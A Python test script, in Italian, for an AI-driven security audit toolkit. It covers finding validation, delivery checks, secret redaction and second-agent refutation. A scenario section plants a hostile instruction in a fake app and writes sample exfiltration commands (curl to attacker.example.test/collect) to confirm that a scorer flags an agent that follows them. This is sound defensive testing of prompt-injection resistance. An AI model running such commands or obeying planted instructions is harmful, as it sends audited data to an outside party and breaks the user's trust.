    check("prepass: checklist pre-compilata (R01, R02, R08) e R07 dichiarata non eseguita senza rete", cl["R01"]["esito"] == "parziale" and cl["R02"]["esito"] == "parziale" and cl["R08"]["esito"] == "parziale" and cl["R07"]["esito"] == "non esaminato" and "rete" in cl["R07"]["motivo"], r.stdout + r.stderr)
    camp = (pa1 / "registro-tool" / "campione-r03.txt").read_text(encoding="utf-8").splitlines()
    check("prepass: campione R03 con prima la modifica di un utente", bool(camp) and camp[0].split()[:2] == ["PATCH", "/api/users/:id"] and cl["R03"]["esito"] == "parziale", "\n".join(camp[:3]))
    rs = list(csv.DictReader((pa1 / "registro-tool" / "route-senza-auth.csv").open(encoding="utf-8")))
    check("prepass: route senza auth da classificare una per una", len(rs) == 2 and all(not r["classificazione"] for r in rs), str(rs))
    cdm = run("check_delivery.py", pa1)
    check("consegna: route senza auth non classificate segnalate", "route senza auth classificate" in cdm.stdout and "2 su 2" in cdm.stdout, cdm.stdout[-400:])
    check("consegna: meta.json con il testo del modello è da verificare", "meta.json compilato" in cdm.stdout and "versione" in cdm.stdout, cdm.stdout[-300:])
    check("prepass: R02 elenca la route di seed", "/api/internal/seed-demo" in (pa1 / "registro-tool" / "route-di-servizio.txt").read_text(encoding="utf-8"))
    check("prepass: output identico tra due giri", all((pa1 / f).read_text(encoding="utf-8") == (pa2 / f).read_text(encoding="utf-8") for f in ("checklist-rapido.csv", "coverage-matrix.csv", "endpoint-matrix.csv", "registro-tool/iac.json")))
    cd = run("check_delivery.py", pa1)
    check("consegna: checklist con aree non compilate fa fallire", cd.returncode == 1 and "non compilate" in cd.stdout, cd.stdout[-300:])
    cl["R03"].update(esito="esaminato", riferimenti="")
    sys.path.insert(0, str(SC)); import checklist as _cl
    rows = list(cl.values())
    for x in rows:
        if not x["esito"]:
            x.update(esito="non esaminato", motivo="fuori tempo")
    _cl.write(pa1, rows)
    cd2 = run("check_delivery.py", pa1)
    check("consegna: «esaminato» senza riferimenti è da verificare", "R03 (esaminato senza riferimenti)" in cd2.stdout, cd2.stdout[-400:])

if have("iac_check.py"):
    r = run("iac_check.py", FX / "iac", "--sarif", tmp / "iac.sarif", "--json", tmp / "iac.json")
    res = json.loads((tmp / "iac.json").read_text(encoding="utf-8"))
    ids = {x["ruleId"] for x in res}
    check("iac: 16 indizi e tutte le 14 regole scattano", len(res) == 16 and len(ids) == 14, f"{len(res)} {len(ids)}")
    check("iac: nessun falso positivo su postgres:16, 127.0.0.1, ${VAR}, actions/*", not any(x["file"] == "docker-compose.yml" and x["line"] in (2, 3, 12, 14, 16) for x in res))
    check("iac: il valore dei segreti non compare", "VALORE-IAC-DI-PROVA" not in (tmp / "iac.sarif").read_text(encoding="utf-8") + (tmp / "iac.json").read_text(encoding="utf-8") + r.stdout)
    r5 = run("import_scanner.py", "--sarif", tmp / "iac.sarif", "--out", tmp / "cand-iac.json")
    check("iac: il SARIF è importabile e valido", r5.returncode == 0 and run("validate_findings.py", tmp / "cand-iac.json").returncode == 0)

if have("import_openapi.py"):
    r = run("import_openapi.py", FX / "openapi/api.yaml", "--repo", FX / "openapi/app", "--out", tmp / "oa.csv")
    out = r.stdout
    check("openapi: 4 operazioni, 1 pubblica per dichiarazione", "operazioni nella specifica: 4" in out and "pubbliche per dichiarazione: 1" in out, out[:200])
    check("openapi: confronto spec/codice (2 solo spec, 1 solo codice)", "non trovato nel codice: 2" in out and "non documentato: 1" in out, out[-300:])
    check("openapi: segnala secret-debug come solo codice", "secret-debug" in out)
    check("openapi: CSV scritto con prefisso del server", "/api/orders/{id}" in (tmp / "oa.csv").read_text(encoding="utf-8"))
    bad = tmp / "x.json"; bad.write_text('{"foo": 1}')
    check("openapi: file non OpenAPI rifiutato", run("import_openapi.py", bad).returncode != 0)
    if have("export_findings.py"):
        run("export_findings.py", tmp / "cand.json", "--csv", tmp / "o.csv", "--sarif", tmp / "o.sarif", "--md-dir", tmp / "md")
        sar = json.loads((tmp / "o.sarif").read_text(encoding="utf-8"))
        check("export: SARIF valido con 3 risultati", sar["version"] == "2.1.0" and len(sar["runs"][0]["results"]) == 3)
        check("export: CSV e Markdown creati", (tmp / "o.csv").exists() and len(list((tmp / "md").glob("*.md"))) == 3)
    if have("verify_findings.py"):
        r = run("verify_findings.py", tmp / "cand.json", "--repo", APP)
        bad = json.loads((tmp / "cand.json").read_text(encoding="utf-8"))[:1]
        bad[0]["prova"]["riferimenti_file"] = ["file/che/non/esiste.ts:10"]
        (tmp / "bad-f.json").write_text(json.dumps(bad))
        r = run("verify_findings.py", tmp / "bad-f.json", "--repo", APP)
        check("revisore: segnala i riferimenti inesistenti", r.returncode == 1 and "inesistente" in r.stdout, r.stdout[:200])
    if have("compare_audits.py"):
        new = cand[1:]
        (tmp / "new.json").write_text(json.dumps(new))
        r = run("compare_audits.py", tmp / "cand.json", tmp / "new.json", "--json", tmp / "cmp.json")
        c = json.loads((tmp / "cmp.json").read_text(encoding="utf-8"))
        check("confronto: un risolto e due invariati", len(c["risolti"]) == 1 and len(c["invariati"]) == 2, str({k: len(v) for k, v in c.items()}))

if have("coverage_carry.py"):
    import shutil
    repo = tmp / "repo"; shutil.copytree(APP, repo)
    a1, a2 = tmp / "audit1", tmp / "audit2"; a1.mkdir()
    (a1 / "coverage-matrix.csv").write_text(
        "area_o_percorso,tipo,modalita_verifica,esaminato,motivo_esclusione,note\n"
        "ESEMPIO: x,file,lettura,si,,\n"
        "server.js,file,lettura,si,,\n"
        "src/app/api,directory,lettura,si,,\n"
        "prisma,directory,lettura,no,non letto,\n"
        "documento-esterno,verbale,documento,si,,\n")
    r = run("coverage_carry.py", "stamp", a1, "--repo", repo, "--run", "r1")
    check("registro: impronte salvate sulle voci del repository", "impronte salvate: 2" in r.stdout, r.stdout)
    (repo / "server.js").write_text((repo / "server.js").read_text(encoding="utf-8") + "\n// modifica\n", encoding="utf-8")
    r = run("coverage_carry.py", "carry", a1, a2, "--repo", repo, "--run", "r2")
    res = {x["area_o_percorso"]: x for x in csv.DictReader((a2 / "coverage-matrix.csv").open(encoding="utf-8"))}
    check("registro: riporta la voce invariata", res["src/app/api"]["esaminato"] == "si" and res["src/app/api"]["origine"].startswith("riportata"), r.stdout)
    check("registro: rende stantia la voce cambiata", res["server.js"]["esaminato"] == "no" and res["server.js"]["origine"].startswith("stantia"), r.stdout)
    check("registro: voce senza impronta da riverificare", res["documento-esterno"]["esaminato"] == "no")
    check("registro: le righe d'esempio sono tolte", not any(k.startswith("ESEMPIO") for k in res))
    check("registro: segnala file non coperti", "non coperti" in r.stdout, r.stdout)
    check("registro: non sovrascrive senza --force", run("coverage_carry.py", "carry", a1, a2, "--repo", repo).returncode == 2)
    s = run("coverage_summary.py", a2)
    check("riepilogo: mostra riportate e stantie", "1** voci riportate" in s.stdout and "1** stantie" in s.stdout, s.stdout[:400])

if have("verify_findings.py"):
    hi = json.loads((tmp / "cand.json").read_text(encoding="utf-8"))[:1] if (tmp / "cand.json").exists() else []
    if hi:
        hi[0]["severita"] = "alta"; hi[0]["stato"] = "confermato da codice o configurazione"; hi[0]["confidenza"] = "media"
        hi[0]["prova"]["riferimenti_file"] = ["server.js:1"]; hi[0]["intervento"]["mitigazione_temporanea"] = "bloccare a monte"
        (tmp / "hi.json").write_text(json.dumps(hi))
        r = run("verify_findings.py", tmp / "hi.json", "--repo", APP, "--brief-dir", tmp / "brief")
        check("smentita: finding alto senza smentita è un rilievo", r.returncode == 1 and "senza smentita" in r.stdout, r.stdout[:300])
        brief = (tmp / "brief" / f"smentita-{hi[0]['id']}.md")
        check("smentita: brief per il verificatore, senza la motivazione dell'autore", brief.exists() and hi[0]["motivazione_severita"] not in brief.read_text(encoding="utf-8"))
        hi[0]["smentita"] = {"esito": "resiste", "verificatore": "secondo agente in una sessione nuova, solo con il brief", "tentativi": ["controllo a monte: nessun middleware sul percorso"]}
        (tmp / "hi2.json").write_text(json.dumps(hi))
        r = run("verify_findings.py", tmp / "hi2.json", "--repo", APP)
        check("smentita: con esito e tentativi il rilievo scompare", "smentita" not in r.stdout, r.stdout[:300])
        v = run("validate_findings.py", tmp / "hi2.json")
        check("smentita: il campo supera la validazione dello schema", v.returncode == 0, v.stdout[-300:])
        hi[0]["smentita"]["verificatore"] = "stesso agente che ha scritto il finding"
        (tmp / "hi4.json").write_text(json.dumps(hi))
        check("smentita: fatta dall'autore stesso segnalata", "autore stesso" in run("verify_findings.py", tmp / "hi4.json", "--repo", APP).stdout)
        hi[0]["smentita"]["verificatore"] = "secondo passaggio separato"
        hi[0]["impatto"]["reale"] = "Difetto dimostrativo nel sorgente; nessun dato reale né esecuzione."
        (tmp / "hi5.json").write_text(json.dumps(hi))
        check("revisore: impatto che dichiara l'assenza di dati reali accettato", "impatto" not in run("verify_findings.py", tmp / "hi5.json", "--repo", APP).stdout)
        hi[0]["smentita"]["esito"] = "forse"
        (tmp / "hi3.json").write_text(json.dumps(hi))
        check("smentita: esito non valido rifiutato", run("validate_findings.py", tmp / "hi3.json").returncode == 1)

if have("redact_check.py"):
    leak = tmp / "leak.txt"; leak.write_text("token " + "gh" + "p_" + "abcdefghijklmnopqrstuvwxyz0123456789AB" + " e password: Sup3r" + "Segreta!\n")  # costruito a runtime: nessun segreto-simile nel repository
    r = run("redact_check.py", leak)
    check("redazione: trova segreti ed esce con 1", r.returncode == 1 and "ALTO" in r.stdout)
    check("redazione: non stampa il valore", "ghp_abcdef" not in r.stdout and "Sup3rSegreta" not in r.stdout)
    clean = tmp / "clean.md"; clean.write_text("Nessun dato sensibile. password: ***** e token: <redatto>\n")
    check("redazione: testo pulito esce con 0", run("redact_check.py", clean).returncode == 0)

if have("draft_ropa.py"):
    r = run("draft_ropa.py", APP, "--out", tmp / "ropa")
    sup = (tmp / "ropa" / "fornitori-bozza.csv").read_text(encoding="utf-8")
    mod = (tmp / "ropa" / "processing-map-bozza.csv").read_text(encoding="utf-8")
    check("bozza art. 30: fornitori attesi", all(f in sup for f in EXP["fornitori_attesi"]), sup[:200])
    check("bozza art. 30: modelli con dati personali", all(f"«{m}»" in mod for m in EXP["modelli_con_dati_personali"]))
    check("bozza art. 30: tutto in ipotesi", "ipotesi da validare" in mod and "ipotesi da validare" in sup)

if have("retention_check.py"):
    r = run("retention_check.py", APP, "--out", tmp / "ret.csv")
    check("retention: trova il job pianificato", "job pianificati 1" in r.stdout or "job pianificati 2" in r.stdout, r.stdout[:150])
    check("retention: trova la cancellazione con soglia", "cancellazione con soglia" in (tmp / "ret.csv").read_text(encoding="utf-8"))

if have("cookie_scan.py"):
    r = run("cookie_scan.py", "https://example.com")
    check("cookie scan: URL non locale rifiutato senza --autorizzato", r.returncode == 1 and "RIFIUTATO" in (r.stdout + r.stderr))

if have("build_report_pdf.py"):
    ex = [p for p in (ROOT / "examples").glob("*") if p.is_dir()][0]
    for label, extra in (("completo", []), ("sintetico", ["--sintetico"]), ("inglese", ["--lang", "en"]), ("NIS2", ["--nis2"])):
        out = tmp / f"{label}.pdf"
        r = run("build_report_pdf.py", ex, "--meta", ex / "meta.json", "--out", out, *extra)
        check(f"PDF {label}", r.returncode == 0 and out.exists() and out.stat().st_size > 5000, r.stderr[-200:])


if have("check_delivery.py"):
    import shutil as _sh
    aud = tmp / "aud"; (aud / "findings").mkdir(parents=True)
    if (tmp / "hi.json").exists():
        _sh.copy(tmp / "hi.json", aud / "findings" / "findings.json")
        r = run("check_delivery.py", aud)
        check("consegna: finding alto senza smentita fa fallire", r.returncode == 1 and "mancante su" in r.stdout, r.stdout[-300:])
        _sh.copy(tmp / "hi2.json", aud / "findings" / "findings.json")
        r = run("check_delivery.py", aud)
        check("consegna: con la smentita non fallisce", r.returncode == 0, r.stdout[-400:])
    fake = tmp / "fakeapp"; fake.mkdir()
    sv = "Zq" + "9xK2mPLw7Rt"   # costruito a runtime
    (fake / "config.py").write_text(f'SECRET_KEY = "{sv}"\n', encoding="utf-8")
    (aud / "note.md").write_text(f"La chiave e {sv} nel file.\n", encoding="utf-8")
    r = run("check_delivery.py", aud, "--app", fake)
    check("consegna: il valore del segreto dell'app nell'audit fa fallire", r.returncode == 1 and "valore di un segreto" in r.stdout)
    check("consegna: non stampa il valore del segreto", sv not in r.stdout + r.stderr)
    (aud / "note.md").write_text("L'applicazione e conforme e sicura.\n", encoding="utf-8")
    r = run("check_delivery.py", aud)
    check("consegna: «conforme» come giudizio da verificare", "parole vietate" in r.stdout and "da rileggere" in r.stdout, r.stdout[-300:])
    (aud / "note.md").write_text("Non esprime giudizi di conformita e non dichiara l'app sicura.\n", encoding="utf-8")
    check("consegna: frase di avvertenza non segnalata", "da rileggere" not in run("check_delivery.py", aud).stdout)

if have("canonicalize.py"):
    ca = tmp / "audit-en"; (ca / "findings").mkdir(parents=True)
    ex = json.loads((ROOT / "examples" / "findings.example.json").read_text(encoding="utf-8")) if (ROOT / "examples" / "findings.example.json").exists() else None
    if ex:
        ex[0].update(stato="Dynamically reproduced", severita="High", confidenza="medium")
        ex[0]["smentita"]["esito"] = "holds"
        ex[0]["titolo"] = "High-severity title stays untouched"
        (ca / "findings" / "findings.json").write_text(json.dumps(ex), encoding="utf-8")
        r = run("canonicalize.py", ca, "--dry-run")
        check("canonicalize: dry-run elenca 4 sostituzioni e non scrive", "farebbe: 4" in r.stdout and "Dynamically" in (ca / "findings" / "findings.json").read_text(encoding="utf-8"), r.stdout[:200])
        if have("check_delivery.py"):
            r = run("check_delivery.py", ca)
            check("consegna: valori in inglese segnalati prima della normalizzazione", "valori enumerati canonici" in r.stdout and "canonicalize.py" in r.stdout, r.stdout[-300:])
        r = run("canonicalize.py", ca)
        out = json.loads((ca / "findings" / "findings.json").read_text(encoding="utf-8"))[0]
        check("canonicalize: valori riportati in italiano, testo libero intatto",
              out["stato"] == "riprodotto dinamicamente" and out["severita"] == "alta" and out["confidenza"] == "media" and out["smentita"]["esito"] == "resiste" and out["titolo"] == "High-severity title stays untouched")
        check("canonicalize: idempotente", "fatte: 0" in run("canonicalize.py", ca).stdout)
        check("canonicalize: i finding riportati validano", run("validate_findings.py", ca / "findings" / "findings.json").returncode == 0 if have("validate_findings.py") else True)
    gmc = tmp / "audit-gdpr-en"; gmc.mkdir()
    (gmc / "gdpr-matrix.csv").write_text("controllo,area,evidenza_tecnica,evidenza_documentale,decisione_mancante,stato,gap,rischio_per_gli_interessati,domanda_id,smentita\nA,Mappa,,,,Found,,,,\nB,Base,,,,hypothesis,,,,\n", encoding="utf-8")
    run("canonicalize.py", gmc)
    rows = list(csv.DictReader((gmc / "gdpr-matrix.csv").open(encoding="utf-8")))
    check("canonicalize: matrice GDPR, stati in inglese riportati", [r["stato"] for r in rows] == ["riscontrato", "ipotesi"], str([r["stato"] for r in rows]))

SCN = ROOT / "tests" / "scenarios" / "score_scenarios.py"
if SCN.exists() and (ROOT / "examples" / "findings.example.json").exists():
    import copy
    import shutil

    def _scn(*args):
        return subprocess.run([sys.executable, str(SCN), *map(str, args)], capture_output=True, text=True)
    _d = tmp / "scn"
    _scn("prepare", _d)
    _app, _inj = _d / "vuln-app", _d / "vuln-app-injected"
    check("scenari: prepare crea app finta e app con istruzione ostile", (_app / "server.js").exists() and "attacker.example.test" in (_inj / "src" / "notes.ts").read_text(encoding="utf-8") and not (_app / "src" / "notes.ts").exists())
    _base = json.loads((ROOT / "examples" / "findings.example.json").read_text(encoding="utf-8"))[0]

    def _mk(name, **opt):
        a = _d / name
        (a / "findings").mkdir(parents=True)
        (a / "report").mkdir()
        fs = []
        for i, (title, text) in enumerate((("Admin users endpoint without authentication", "/api/admin/users"), ("Debug env endpoint exposes variables", "/api/debug/env"), ("JWT secret hardcoded in server.js", "server.js JWT_SECRET"))):
            f = copy.deepcopy(_base)
            f["id"] = f"APP-00{i+1}"
            f["titolo"] = title
            f["asset"] = "vuln-app " + text
            f.update(stato="confermato da codice o configurazione", severita=opt.get("sev", "media"), confidenza="media")
            f["prova"].update(tipo="codice", test_eseguito=False, descrizione="server.js e route: " + text, riferimenti_file=[f"server.js:{i+1}"])
            f["prova"].pop("data_esecuzione", None)
            f["riproduzione"] = ["Leggere server.js"]
            f["categoria"] = f"Categoria {i}"
            f["atteso"] = f"Atteso {i}: accesso controllato"
            f["osservato"] = f"Osservato {i}: nessun controllo nel codice di {text}"
            f["impatto"] = {"reale": "non dimostrato: nessun test eseguito", "potenziale": f"Potenziale {i}: accesso non autorizzato", "condizioni_limitanti": "da verificare"}
            f["motivazione_severita"] = f"Motivazione {i}: letto nel codice, non provato"
            if opt.get("sev") == "alta" and not opt.get("nosmentita"):
                f["smentita"].update(esito="non eseguita", verificatore="nessuno disponibile", tentativi=["non eseguita"])
            else:
                f.pop("smentita", None)
            fs.append(f)
        (a / "findings" / "findings.json").write_text(json.dumps(fs), encoding="utf-8")
        (a / "endpoint-matrix.csv").write_text("endpoint,metodo,fonte_scoperta,identita,ruolo,tenant,oggetto,azione,controllo_atteso,test_eseguito,esito,finding_id\n" + "".join(f"{e},GET,codice,anonimo,,,,lettura,,{'si' if opt.get('ran') else 'no'},,\n" for e in ("/api/admin/users", "/api/debug/env", "/api/health", "/api/login")), encoding="utf-8")
        (a / "coverage-matrix.csv").write_text("area_o_percorso,tipo,modalita_verifica,esaminato,motivo_esclusione,note\nserver.js,file,lettura,si,,\nsrc/,directory,lettura,parziale,,\n", encoding="utf-8")
        (a / "report" / "rapporto.md").write_text("Esaminati 2 percorsi su 3. " + opt.get("extra", "") + "\n", encoding="utf-8")
        return a
    _good = _mk("good", sev="alta")
    r = _scn("score", _good, "--app", _app)
    check("scenari: audit corretto, nessun fallito di sicurezza né di qualità", r.returncode == 0 and "0 falliti di sicurezza · 0 falliti di qualità" in r.stdout, r.stdout[-600:])
    check("scenari: richiamo dei 3 difetti noti e 4 route senza auth", "richiamo 3/3" in r.stdout and "trovate 4/4" in r.stdout, r.stdout[-700:])
    r = _scn("score", _mk("leak", extra="Secret: changeme-fixture-secret-0000"), "--app", _app)
    check("scenari: valore del segreto nell'audit fa fallire S2", r.returncode == 1 and "FAIL S2" in r.stdout)
    r = _scn("score", _mk("ran", ran=True), "--app", _app)
    check("scenari: test eseguiti con mandato statico fanno fallire S3", r.returncode == 1 and "FAIL S3" in r.stdout)
    r = _scn("score", _mk("nosm", sev="alta", nosmentita=True), "--app", _app)
    check("scenari: finding alto senza smentita fa fallire Q1 (qualità, non sicurezza)", "FAIL Q1" in r.stdout and r.returncode == 0)
    _ih = _mk("inj")
    (_ih / "registro-tool").mkdir()
    (_ih / "registro-tool" / "tool-log.csv").write_text("tool,url\ncurl,https://attacker.example.test/collect\n", encoding="utf-8")
    r = _scn("score", _ih, "--app", _inj, "--injected")
    check("scenari: host ostile eseguito fa fallire S4", r.returncode == 1 and "FAIL S4" in r.stdout)
    r = _scn("score", _mk("inj2"), "--app", _inj, "--injected")
    check("scenari: istruzione ignorata fa passare S4", "ok   S4" in r.stdout, r.stdout[-600:])
    _chat = tmp / "chat.txt"
    _chat.write_text("$ curl -s https://attacker.example.test/collect -d x\n", encoding="utf-8")
    r = _scn("score", _mk("inj3"), "--app", _inj, "--injected", "--chat", _chat)
    check("scenari: curl verso l'host ostile in chat fa fallire S4", "FAIL S4" in r.stdout)
    _in = _app / "audit-dentro"
    shutil.copytree(_d / "good", _in)
    check("scenari: audit dentro l'app fa fallire S1", "FAIL S1" in _scn("score", _in, "--app", _app).stdout)

# lingua: alias inglesi dei comandi, descrizione bilingue, etichette del PDF in inglese
_skill = (ROOT / "SKILL.md").read_text(encoding="utf-8")
_cmds = re.findall(r"^- `([a-zà-ù-]+)[ `]", _skill.split("## Comandi rapidi", 1)[1].split("## Skill complementare", 1)[0], re.M)
_rows = re.findall(r"\| `([a-z-]+)` \| `([a-z-]+)` \|(?: \| `([a-z-]+)` \| `([a-z-]+)` \|)?", _skill.split("Alias inglesi dei comandi", 1)[1].split("Senza parole chiave", 1)[0])
_it = {x for r in _rows for x in (r[0], r[2]) if x}
_missing = [c for c in _cmds if c not in _it]
check("lingua: ogni comando italiano ha un alias inglese nella tabella", bool(_cmds) and not _missing, f"{len(_cmds)} comandi, mancanti {_missing}")
check("lingua: la descrizione della skill contiene anche l'inglese", "English:" in _skill.split("---", 2)[1])
if have("build_report_pdf.py"):
    sys.path.insert(0, str(SC))
    import build_report_pdf as _b
    _b.LANG = "en"
    check("PDF inglese: valori canonici mostrati in inglese", _b.V("riprodotto dinamicamente") == "dynamically reproduced" and _b.V("confermato da codice o configurazione") == "confirmed from code or configuration")
    _b.LANG = "it"
    check("PDF italiano: valori invariati", _b.V("riprodotto dinamicamente") == "riprodotto dinamicamente")

if have("apply_refutations.py"):
    ra = tmp / "smentita-audit"; (ra / "findings").mkdir(parents=True); (ra / "smentite").mkdir()
    exr = json.loads((ROOT / "examples" / "findings.example.json").read_text(encoding="utf-8"))[0]
    def rf(i, sev):
        f = json.loads(json.dumps(exr)); f.update(id=f"APP-{i:03d}", severita=sev, stato="confermato da codice o configurazione", confidenza="alta")
        f["smentita"] = {"esito": "non eseguita", "verificatore": "nessuno", "tentativi": ["da fare"]}
        return f
    (ra / "findings" / "findings.json").write_text(json.dumps([rf(1, "alta"), rf(2, "alta"), rf(3, "critica")]), encoding="utf-8")
    bad = [{"id": "APP-001", "esito": "declassato", "verificatore": "v", "tentativi": ["t"], "severita": "critica", "motivo": "m"}]
    (ra / "smentite" / "esiti.json").write_text(json.dumps(bad), encoding="utf-8")
    rb = run("apply_refutations.py", ra)
    check("smentita: un «declassato» che alza la severità è rifiutato e non scrive nulla", rb.returncode == 1 and "deve abbassare" in rb.stdout
          and json.loads((ra / "findings" / "findings.json").read_text(encoding="utf-8"))[0]["smentita"]["esito"] == "non eseguita", rb.stdout)
    good = [{"id": "APP-001", "esito": "resiste", "verificatore": "secondo agente", "tentativi": ["t1"]},
            {"id": "APP-002", "esito": "declassato", "verificatore": "secondo agente", "tentativi": ["t2"], "stato": "ipotesi da validare", "motivo": "dipende da un flag"},
            {"id": "APP-003", "esito": "respinto", "verificatore": "secondo agente", "tentativi": ["t3"], "motivo": "query parametrizzata"}]
    (ra / "smentite" / "esiti.json").write_text(json.dumps(good), encoding="utf-8")
    rg = run("apply_refutations.py", ra)
    fs_ = {f["id"]: f for f in json.loads((ra / "findings" / "findings.json").read_text(encoding="utf-8"))}
    resp = json.loads((ra / "findings" / "respinti.json").read_text(encoding="utf-8")) if (ra / "findings" / "respinti.json").exists() else []
    check("smentita: esiti applicati (resiste, declassato con confidenza ridotta, respinto spostato fuori)",
          fs_.get("APP-001", {}).get("smentita", {}).get("esito") == "resiste" and fs_.get("APP-002", {}).get("stato") == "ipotesi da validare"
          and fs_.get("APP-002", {}).get("confidenza") == "media" and "APP-003" not in fs_ and [f["id"] for f in resp] == ["APP-003"], rg.stdout)
    vr2 = run("validate_findings.py", ra / "findings" / "findings.json")
    check("smentita: i finding dopo l'applicazione validano", vr2.returncode == 0, vr2.stdout[-300:])

if have("verify_findings.py"):
    vh = tmp / "vh"; vh.mkdir()
    exv = json.loads((ROOT / "examples" / "findings.example.json").read_text(encoding="utf-8"))[0]
    fv = json.loads(json.dumps(exv)); fv.update(id="APP-001", severita="media"); fv["prova"]["riferimenti_file"] = ["scripts/rotate-cron.sh@a1b2c3d", "scripts/vecchio.sh (storia Git)"]
    (vh / "f.json").write_text(json.dumps([fv]), encoding="utf-8")
    (vh / "revisione.md").write_text("vecchio\n\n## Risposte\nAPP-001: motivato a mano\n", encoding="utf-8")
    rv = run("verify_findings.py", vh / "f.json", "--repo", vh, "--md", vh / "revisione.md")
    txt = (vh / "revisione.md").read_text(encoding="utf-8")
    check("revisore: i riferimenti solo nella storia Git non sono «inesistenti»", "riferimento inesistente" not in rv.stdout, rv.stdout[-300:])
    fv2 = json.loads(json.dumps(fv)); fv2.update(id="APP-002", stato="confermato da codice o configurazione"); fv2["prova"]["riferimenti_file"] = ["f.json", "audit:dinamico/registro.tsv"]
    fv3 = json.loads(json.dumps(fv2)); fv3["id"] = "APP-003"; fv3["prova"]["riferimenti_file"] = ["f.json:1", "audit:dinamico/registro.tsv"]
    (vh / "g.json").write_text(json.dumps([fv2, fv3]), encoding="utf-8")
    rv2 = run("verify_findings.py", vh / "g.json", "--repo", vh)
    fv4 = json.loads(json.dumps(fv3)); fv4.update(id="APP-004", severita="alta")
    fv4["smentita"] = {"esito": "resiste", "verificatore": "secondo passaggio di revisione indipendente (dal solo brief)", "tentativi": ["provato"]}  # stessa conversazione: va segnalato
    (vh / "h.json").write_text(json.dumps([fv4]), encoding="utf-8")
    rv3 = run("verify_findings.py", vh / "h.json")
    check("revisore: una smentita da «secondo passaggio» senza sessione o agente diversi è segnalata", "secondo passaggio" in rv3.stdout, rv3.stdout[-300:])
    check("revisore: chiede la riga per i finding confermati; «audit:» non è cercato nel repository",
          "senza numero di riga" in rv2.stdout.split("APP-003")[0] and "audit:dinamico" not in rv2.stdout and rv2.stdout.count("senza numero di riga") == 1, rv2.stdout[-500:])
    check("revisore: la sezione «## Risposte» di revisione.md sopravvive a una nuova esecuzione", "APP-001: motivato a mano" in txt and "vecchio" not in txt, txt[-300:])

if have("check_delivery.py") and have("init_audit.py"):
    md = tmp / "mod-standard"
    run("init_audit.py", md)
    mj = json.loads((md / "meta.json").read_text(encoding="utf-8")); mj["modalita"] = "standard · analisi statica + dinamica autorizzata"
    (md / "meta.json").write_text(json.dumps(mj), encoding="utf-8")
    r1 = run("check_delivery.py", md)
    check("modalità standard: senza threat model, sintesi e controlli `chiudi` fallisce sui deliverable",
          "deliverable della modalità standard" in r1.stdout and "threat-model.md" in r1.stdout, r1.stdout[-500:])
    (md / "report").mkdir(exist_ok=True)
    for n in ("sintesi.md", "threat-model.md"):
        (md / "report" / n).write_text("# " + n + "\n" + "contenuto reale " * 30, encoding="utf-8")
    with (md / "controls-matrix.csv").open("a", encoding="utf-8") as fh:
        fh.write("OWASP ASVS,5.0,V8,controllo di accesso,si (L2),,src/x.ts:1,verificato,\n")
    with (md / "endpoint-matrix.csv").open("a", encoding="utf-8") as fh:
        fh.write("/api/orders/:id,GET,codice,utente-B,utente,altro,ordine,lettura,403,si,utente-B: 403,\n")
    (md / "findings" / "rapido.json").write_text("[]", encoding="utf-8")
    r2 = run("check_delivery.py", md)
    check("modalità standard: senza findings/rapido.json `chiudi` fallisce", "FAIL base del rapido" in r1.stdout, r1.stdout[-600:])
    check("modalità standard: con i deliverable e un test dinamico registrato i due controlli passano",
          "ok   deliverable della modalità standard" in r2.stdout and "ok   test dinamici registrati" in r2.stdout, r2.stdout[-600:])
    check("modalità standard: nessun finding oltre al rapido è segnalato", "!!   finding aggiunti dalla modalità standard" in r2.stdout, r2.stdout[-600:])
    (md / "revisione.md").write_text("# Revisione\n\n## Risposte\nNessun nuovo finding: repository minimo, tutte le aree chiuse nel rapido.\n", encoding="utf-8")
    r3 = run("check_delivery.py", md)
    check("modalità standard: «nessun nuovo finding» motivato in ## Risposte toglie la segnalazione", "finding aggiunti dalla modalità" not in r3.stdout, r3.stdout[-600:])
    import csv as _c
    clp = md / "checklist-rapido.csv"
    rows = list(_c.DictReader(clp.open(encoding="utf-8")))
    for r in rows:
        r.update(esito="esaminato", riferimenti="src/x.ts:1", motivo="ok")
    rows[3]["motivo"] = "recupero con domanda di sicurezza indovinabile, non promosso a finding"
    rows[10]["motivo"] = "SSRF possibile su url immagine, da approfondire"
    with clp.open("w", newline="", encoding="utf-8") as fh:
        w = _c.DictWriter(fh, fieldnames=list(rows[0].keys())); w.writeheader(); w.writerows(rows)
    r4 = run("check_delivery.py", md)
    check("checklist: «non promosso» e «da approfondire» nel motivo sono segnalati con l'area",
          "problemi annotati nella checklist" in r4.stdout and "R04, R11" in r4.stdout, r4.stdout[-600:])
    (md / "revisione.md").write_text("# Revisione\n\n## Risposte\nNessun nuovo finding.\nR04: le domande sono solo per account demo, non un difetto.\n", encoding="utf-8")
    r5 = run("check_delivery.py", md)
    check("checklist: un'area motivata in ## Risposte non è più segnalata", "R11" in r5.stdout and "R04" not in r5.stdout.split("problemi annotati")[1].split("\n")[0], r5.stdout[-600:])
    (md / "registro-tool" / "punti-pericolosi.txt").write_text("## html senza escape: 1\nsrc/view.ts:9\n## URL dall'utente (SSRF): 1\nsrc/img.ts:24\n", encoding="utf-8")
    pc = md / "punti-pericolosi.csv"
    pc.write_text("categoria,punti,esito,finding,motivo\nhtml senza escape,1,,,\nURL dall'utente (SSRF),1,non esaminato,,manca tempo\n", encoding="utf-8")
    r6 = run("check_delivery.py", md)
    check("punti pericolosi: nello standard una categoria senza esito o «non esaminato» fa fallire `chiudi`",
          "FAIL punti pericolosi" in r6.stdout and "html senza escape (esito mancante" in r6.stdout, r6.stdout[-600:])
    fz = {"id": "APP-001", "titolo": "x", "prova": {"riferimenti_file": ["src/altro.ts:1"]}}
    (md / "findings" / "findings.json").write_text(json.dumps([fz]), encoding="utf-8")
    pc.write_text("categoria,punti,esito,finding,motivo\nhtml senza escape,1,finding,APP-001,\nURL dall'utente (SSRF),1,non difetto,,l'URL è una costante\n", encoding="utf-8")
    r7 = run("check_delivery.py", md)
    check("punti pericolosi: un finding che non cita file della categoria e un «non difetto» senza file letto non bastano",
          "nessuno dei finding cita un file della categoria" in r7.stdout and "SSRF) (non difetto" in r7.stdout, r7.stdout[-600:])
    fz["prova"]["riferimenti_file"] = ["src/view.ts:9"]
    (md / "findings" / "findings.json").write_text(json.dumps([fz]), encoding="utf-8")
    pc.write_text("categoria,punti,esito,finding,motivo\nhtml senza escape,1,finding,APP-001,\nURL dall'utente (SSRF),1,non difetto,,src/img.ts:24 usa solo URL della allowlist interna\n", encoding="utf-8")
    r8 = run("check_delivery.py", md)
